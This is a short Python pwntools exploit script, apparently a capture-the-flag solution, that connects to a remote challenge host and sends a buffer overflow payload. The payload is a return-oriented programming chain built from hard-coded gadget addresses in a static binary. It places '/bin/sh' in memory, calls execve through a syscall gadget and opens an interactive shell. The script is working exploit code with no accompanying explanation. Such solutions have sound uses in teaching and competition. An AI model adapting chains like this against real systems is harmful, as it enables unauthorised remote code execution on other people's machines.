#!/usr/bin/env python3

from pwn import *

LOCAL_BINARY = "./static"
REMOTE_IP = "static.chal.cyberjousting.com"
REMOTE_PORT = 1350

elf = ELF(LOCAL_BINARY, checksec=False)
p = remote(REMOTE_IP, REMOTE_PORT)

SYSCALL = 0x401194
POP_RAX = 0x41069c
POP_RSI = 0x4062d8
POP_RBP = 0x401761
POP_R15 = 0x401fdf
POP_RBX = 0x40166f
POP_R12 = 0x4023e7
MOV_RAX_RSI = 0x425d07
ADD_RAX_RSI = 0x426534
MOV_RCX_RAX_MOV_RAX_RCX = 0x404606
MOV_RDI_RDX_CALL_RSI = 0x4299de
MOV_RSI_RBP_CALL_R15 = 0x45edc9
MOV_RDX_RBP_CALL_RBX = 0x44499e

# 0x464c94 : lea rdx, [rax + 8] ; cmp rcx, rsi ; jb 0x464c81 ; ret
LEA_RDX_RAX = 0x464c94

payload = b""
payload += b"/bin/sh\x00"
payload = payload.rjust(0x12, b"A")
payload += p64(POP_RAX)
payload += p64(1)
payload += p64(MOV_RCX_RAX_MOV_RAX_RCX)
payload += p64(MOV_RAX_RSI)
payload += p64(POP_RSI)
payload += p64(2)
payload += p64(ADD_RAX_RSI)
payload += p64(POP_RSI)
payload += p64(0)
payload += p64(LEA_RDX_RAX)
payload += p64(POP_RAX)
payload += p64(0x3b) # EXECVE
payload += p64(POP_RBP)
payload += p64(0)
payload += p64(POP_RBX)
payload += p64(SYSCALL)
payload += p64(POP_R15)
payload += p64(MOV_RDX_RBP_CALL_RBX)
payload += p64(POP_RSI)
payload += p64(MOV_RSI_RBP_CALL_R15)
payload += p64(MOV_RDI_RDX_CALL_RSI)

p.sendline(payload)

p.interactive()
